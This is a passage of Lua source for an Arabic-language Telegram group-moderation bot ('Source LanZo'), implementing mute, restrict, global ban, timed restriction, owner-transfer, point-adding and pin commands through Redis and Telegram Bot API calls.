Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع كتم ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
if DevaMeR:sismember(LanZo..'aMeR:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevaMeR:sadd(LanZo..'aMeR:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم كتمه من المجموعه")  
end
end
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,MuteUser)
end
if text and text:match('^كتم (%d+)') and ChCheck(msg) then
local user = text:match('كتم (%d+)')
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الكتم والتقيد')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع كتم ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
if DevaMeR:sismember(LanZo..'aMeR:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevaMeR:sadd(LanZo..'aMeR:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","᥀︙تم كتمه من المجموعه")  
end
end
end
--     Source LanZo     --
--         UnMute         --
if text ==('الغاء الكتم') or text ==('الغاء كتم') and ChCheck(msg) then
function UnMuteReply(extra, result, success)
if not DevaMeR:sismember(LanZo..'aMeR:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevaMeR:srem(LanZo..'aMeR:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم الغاء كتمه من المجموعه")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnMuteReply)
end end
if text and (text:match('^الغاء الكتم @(.*)') or text:match('^الغاء كتم @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء الكتم @(.*)') or text:match('^الغاء كتم @(.*)')
function UnMuteUser(extra,result,success)
if result.id_ then
if not DevaMeR:sismember(LanZo..'aMeR:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevaMeR:srem(LanZo..'aMeR:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم الغاء كتمه من المجموعه")  
end
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnMuteUser)
end
if text and (text:match('^الغاء الكتم (%d+)') or text:match('^الغاء كتم (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء الكتم (%d+)') or text:match('الغاء كتم (%d+)')
if not DevaMeR:sismember(LanZo..'aMeR:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevaMeR:srem(LanZo..'aMeR:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","᥀︙تم الغاء كتمه من المجموعه")  
end
end 
end 
--     Source LanZo     --
--          Tkeed           --
if Admin(msg) then
if text ==('تقييد') or text ==('تقيد') and ChCheck(msg) then
function TkeedReply(extra, result, success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الكتم والتقيد')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
DevaMeR:sadd(LanZo..'aMeR:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تقيده من المجموعه")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),TkeedReply)
end end
if text and (text:match('^تقييد @(.*)') or text:match('^تقيد @(.*)')) and ChCheck(msg) then
local username = text:match('^تقييد @(.*)') or text:match('^تقيد @(.*)')
function TkeedUser(extra,result,success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الكتم والتقيد')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع تقيد ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
DevaMeR:sadd(LanZo..'aMeR:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تقيده من المجموعه")  
end
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,TkeedUser)
end
if text and (text:match('^تقييد (%d+)') or text:match('^تقيد (%d+)')) and ChCheck(msg) then
local user = text:match('تقييد (%d+)') or text:match('تقيد (%d+)')
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الكتم والتقيد')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع تقيد ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user)
DevaMeR:sadd(LanZo..'aMeR:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","᥀︙تم تقيده من المجموعه")  
end
end
--     Source LanZo     --
--         UnTkeed          --
if text ==('الغاء تقييد') or text ==('الغاء تقيد') and ChCheck(msg) then
function UnTkeedReply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevaMeR:srem(LanZo..'aMeR:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم الغاء تقيده من المجموعه")  
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnTkeedReply)
end end
if text and (text:match('^الغاء تقييد @(.*)') or text:match('^الغاء تقيد @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء تقييد @(.*)') or text:match('^الغاء تقيد @(.*)')
function UnTkeedUser(extra,result,success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevaMeR:srem(LanZo..'aMeR:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم الغاء تقيده من المجموعه")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnTkeedUser)
end
if text and (text:match('^الغاء تقييد (%d+)') or text:match('^الغاء تقيد (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء تقييد (%d+)') or text:match('الغاء تقيد (%d+)')
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevaMeR:srem(LanZo..'aMeR:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","᥀︙تم الغاء تقيده من المجموعه")  
end
end 
end
--     Source LanZo     --
--         BanAll         --
if SecondSudo(msg) then
if text ==('حضر عام') or text ==('حظر عام') and ChCheck(msg) then
function BanAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(LanZo) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevaMeR:sismember(LanZo..'aMeR:aMeRSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevaMeR:sismember(LanZo..'aMeR:SecondSudo:',result.sender_user_id_) and not aMeRSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevaMeR:sadd(LanZo..'aMeR:BanAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم حظره عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanAllReply)
end end
if text and (text:match('^حضر عام @(.*)') or text:match('^حظر عام @(.*)')) and ChCheck(msg) then
local username = text:match('^حضر عام @(.*)') or text:match('^حظر عام @(.*)')
function BanAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(LanZo) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevaMeR:sismember(LanZo..'aMeR:aMeRSudo:',result.id_) and not Sudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevaMeR:sismember(LanZo..'aMeR:SecondSudo:',result.id_) and not aMeRSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
DevaMeR:sadd(LanZo..'aMeR:BanAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم حظره عام من المجموعات")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,BanAllUser)
end
if text and (text:match('^حضر عام (%d+)') or text:match('^حظر عام (%d+)')) and ChCheck(msg) then
local user = text:match('حضر عام (%d+)') or text:match('حظر عام (%d+)')
if tonumber(user) == tonumber(LanZo) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(tonumber(user)) == true then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevaMeR:sismember(LanZo..'aMeR:aMeRSudo:',user) and not Sudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevaMeR:sismember(LanZo..'aMeR:SecondSudo:',user) and not aMeRSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
DevaMeR:sadd(LanZo..'aMeR:BanAll:', user)
ReplyStatus(msg,user,"Reply","᥀︙تم حظره عام من المجموعات")  
end
--     Source LanZo     --
--         MuteAll        --
if text ==('كتم عام') and ChCheck(msg) then
function MuteAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(LanZo) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevaMeR:sismember(LanZo..'aMeR:aMeRSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevaMeR:sismember(LanZo..'aMeR:SecondSudo:',result.sender_user_id_) and not aMeRSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم المطور الاساسي²*", 1, 'md')
return false 
end
DevaMeR:sadd(LanZo..'aMeR:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم كتمه عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteAllReply)
end end
if text and text:match('^كتم عام @(.*)') and ChCheck(msg) then
local username = text:match('^كتم عام @(.*)')
function MuteAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(LanZo) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevaMeR:sismember(LanZo..'aMeR:aMeRSudo:',result.id_) and not Sudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevaMeR:sismember(LanZo..'aMeR:SecondSudo:',result.id_) and not aMeRSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم المطور الاساسي²*", 1, 'md')
return false 
end
if result.id_ then
DevaMeR:sadd(LanZo..'aMeR:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم كتمه عام من المجموعات")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,MuteAllUser)
end
if text and text:match('^كتم عام (%d+)') and ChCheck(msg) then
local user = text:match('كتم عام (%d+)')
if tonumber(user) == tonumber(LanZo) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(tonumber(user)) == true then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevaMeR:sismember(LanZo..'aMeR:aMeRSudo:',user) and not Sudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevaMeR:sismember(LanZo..'aMeR:SecondSudo:',user) and not aMeRSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم المطور الاساسي²*", 1, 'md')
return false 
end
DevaMeR:sadd(LanZo..'aMeR:MuteAll:', user)
ReplyStatus(msg,user,"Reply","᥀︙تم كتمه عام من المجموعات")  
end
--     Source LanZo     --
--         UnAll          --
if text ==('الغاء عام') or text ==('الغاء العام') and ChCheck(msg) then
function UnAllReply(extra, result, success)
DevaMeR:srem(LanZo..'aMeR:BanAll:', result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnAllReply)
end end
if text and (text:match('^الغاء عام @(.*)') or text:match('^الغاء العام @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء عام @(.*)') or text:match('^الغاء العام @(.*)')
function UnAllUser(extra,result,success)
if result.id_ then
DevaMeR:srem(LanZo..'aMeR:BanAll:', result.id_)
DevaMeR:srem(LanZo..'aMeR:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnAllUser)
end
if text and (text:match('^الغاء عام (%d+)') or text:match('^الغاء العام (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء عام (%d+)') or text:match('الغاء العام (%d+)')
DevaMeR:srem(LanZo..'aMeR:BanAll:', user)
DevaMeR:srem(LanZo..'aMeR:MuteAll:', user)
ReplyStatus(msg,user,"Reply","᥀︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
end
end
end
--     Source LanZo     --
if (text == "تغير المطور الاساسي" or text == "نقل ملكيه البوت" or text == "تغيير المطور الاساسي" or text == "↫ تغير المطور الاساسي ᥀") and msg.reply_to_message_id_ == 0 and Sudo(msg) and ChCheck(msg) then 
send(msg.chat_id_, msg.id_,'᥀︙يجب التاكد ان المطور الجديد ارسل start لخاص البوت بعد ذلك يمكنك ارسال ايدي المطور')
DevaMeR:setex(LanZo.."aMeR:EditDev"..msg.sender_user_id_,300,true)
end
if DevaMeR:get(LanZo.."aMeR:EditDev"..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,'᥀︙تم الغاء امر تغير المطور الاساسي')
DevaMeR:del(LanZo.."aMeR:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
tdcli_function ({ID = "GetUser",user_id_ = text},function(arg,dp) 
if dp.first_name_ ~= false then
DevaMeR:del(LanZo.."aMeR:EditDev"..msg.sender_user_id_)
DevaMeR:set(LanZo.."aMeR:NewDev"..msg.sender_user_id_,dp.id_)
if dp.username_ ~= false then DevUser = '\n᥀︙المعرف ↫ [@'..dp.username_..']' else DevUser = '' end
local Text = '᥀︙الايدي ↫ '..dp.id_..DevUser..'\n᥀︙الاسم ↫ ['..dp.first_name_..'](tg://user?id='..dp.id_..')\n᥀︙تم حفظ المعلومات بنجاح\n᥀︙استخدم الازرار للتاكيد ↫ ⤈'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/setyes"},{text="لا",callback_data="/setno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"᥀︙المعلومات خاطئه قم بالتاكد واعد المحاوله")
DevaMeR:del(LanZo.."aMeR:EditDev"..msg.sender_user_id_)
end
end,nil)
return false
end
end
--     Source LanZo     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") and not DevaMeR:get(LanZo..'aMeR:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if DevaMeR:sismember(LanZo..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو مطي شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المطايه") 
DevaMeR:sadd(LanZo..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source LanZo     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") and not DevaMeR:get(LanZo..'aMeR:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not DevaMeR:sismember(LanZo..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو ليس مطي ليتم تنزيله") 
else
DevaMeR:srem(LanZo..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من قائمة المطايه") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source LanZo     --
if Admin(msg) then
if text and (text:match('^تقييد دقيقه (%d+)$') or text:match('^كتم دقيقه (%d+)$') or text:match('^تقيد دقيقه (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد دقيقه (%d+)$') or text:match('^كتم دقيقه (%d+)$') or text:match('^تقيد دقيقه (%d+)$')
local Minutes = string.gsub(mutept, 'm', '')
local num1 = tonumber(Minutes) * 60 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تقيده لمدة ↫ "..mutept.." د") 
DevaMeR:sadd(LanZo..'aMeR:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end 
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end
if text and (text:match('^تقييد ساعه (%d+)$') or text:match('^كتم ساعه (%d+)$') or text:match('^تقيد ساعه (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد ساعه (%d+)$') or text:match('^كتم ساعه (%d+)$') or text:match('^تقيد ساعه (%d+)$')
local hour = string.gsub(mutept, 'h', '')
local num1 = tonumber(hour) * 3600 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تقيده لمدة ↫ "..mutept.." س") 
DevaMeR:sadd(LanZo..'aMeR:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
if text and (text:match('^تقييد يوم (%d+)$') or text:match('^كتم يوم (%d+)$') or text:match('^تقيد يوم (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد يوم (%d+)$') or text:match('^كتم يوم (%d+)$') or text:match('^تقيد يوم (%d+)$')
local day = string.gsub(mutept, 'd', '')
local num1 = tonumber(day) * 86400 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تقيده لمدة ↫ "..mutept.." ي") 
DevaMeR:sadd(LanZo..'aMeR:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
end 
--     Source LanZo     --
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^اضف رسائل (%d+)$")
DevaMeR:set('LanZoTeam:'..LanZo..'id:user'..msg.chat_id_,TXT)  
DevaMeR:setex('LanZoTeam:'..LanZo.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل عدد الرسائل الان \n᥀︙ارسل الغاء لالغاء الامر ", 1, "md")
Dev_aMeR(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف رسائل (%d+)$")
function Reply(extra, result, success)
DevaMeR:del(LanZo..'aMeR:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
DevaMeR:incrby(LanZo..'aMeR:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم اضافة "..Num..' رساله', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^اضف نقاط (%d+)$")
DevaMeR:set('LanZoTeam:'..LanZo..'ids:user'..msg.chat_id_,TXT)  
DevaMeR:setex('LanZoTeam:'..LanZo.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل عدد النقاط الان \n᥀︙ارسل الغاء لالغاء الامر ", 1, "md")
Dev_aMeR(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف نقاط (%d+)$")
function Reply(extra, result, success)
DevaMeR:incrby(LanZo..'aMeR:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم اضافة "..Num..' نقطه', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if DevaMeR:get(LanZo..'aMeR:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevaMeR:sadd(LanZo.."aMeR:cleaner"..msg.chat_id_, msg.id_) else DevaMeR:sadd(LanZo.."aMeR:cleaner"..msg.chat_id_, msg.id_) end end end
if DevaMeR:get(LanZo..'aMeR:Lock:CleanNum'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevaMeR:sadd(LanZo.."aMeR:cleanernum"..msg.chat_id_, msg.id_) else DevaMeR:sadd(LanZo.."aMeR:cleanernum"..msg.chat_id_, msg.id_) end end end
if DevaMeR:get(LanZo..'aMeR:Lock:CleanMusic'..msg.chat_id_) then if msg.content_.voice_ or msg.content_.audio_ then if msg.reply_to_message_id_ ~= 0 then DevaMeR:sadd(LanZo.."aMeR:cleanermusic"..msg.chat_id_, msg.id_) else DevaMeR:sadd(LanZo.."aMeR:cleanermusic"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if DevaMeR:sismember(LanZo.."aMeR:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_aMeR(msg.chat_id_,msg.id_, 1, "᥀︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
DevaMeR:set(LanZo..'aMeR:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
